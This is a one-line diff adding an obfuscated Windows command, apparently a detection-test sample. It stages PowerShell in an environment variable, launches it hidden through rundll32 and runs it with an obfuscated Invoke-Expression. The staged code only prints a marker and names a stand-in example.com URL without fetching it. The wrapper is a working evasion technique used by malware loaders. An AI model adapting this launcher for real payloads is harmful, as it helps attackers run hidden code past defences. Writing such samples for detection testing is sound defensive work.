@@ -1,0 +1,1 @@
+﻿cMD  /c  "SEt   sGW=Write-Host 'corvus marker'; $u = 'http://example.com/corvus/stage.txt'&&C:\wINDOwS\sYstem32\rUndLl32   SHELL32.DLL,ShellExec_RunDLL   "POwersHeLL"  " -NOpRoF "  "-nONI  "   "-w  HIDden  "    "(   ^&  (  '{1}{0}' -f'r','Di' ) ('{0}{2}{1}'-f 'env','SGW',':' )).'vALUe'^|  .  (   ${pShOme}[4] +  ${pshOMe}[30]  +  'X' )"
